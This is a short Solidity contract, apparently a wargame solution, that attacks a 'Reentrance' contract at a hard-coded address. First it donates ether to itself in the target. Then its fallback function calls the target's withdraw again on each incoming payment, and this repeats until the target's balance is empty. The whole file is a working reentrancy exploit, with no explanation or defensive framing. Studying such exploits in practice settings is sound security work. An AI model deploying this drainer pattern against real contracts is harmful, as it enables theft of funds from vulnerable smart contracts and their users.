import "./Reentrance.sol";

pragma solidity ^0.4.18;

contract Reenter {
    Reentrance public original = Reentrance(0xfb99093c6035e2728f86dc5482217c5d006c7ca2);
    uint public amount = 1 ether;

    constructor() public payable {}

    function() public payable {
        if (address(original).balance != 0 ) {
            original.withdraw(amount);
        }
    }

    function donateToSelf() public {
        original.donate.value(amount).gas(4000000)(address(this)); //need to add value to this fn
    }

}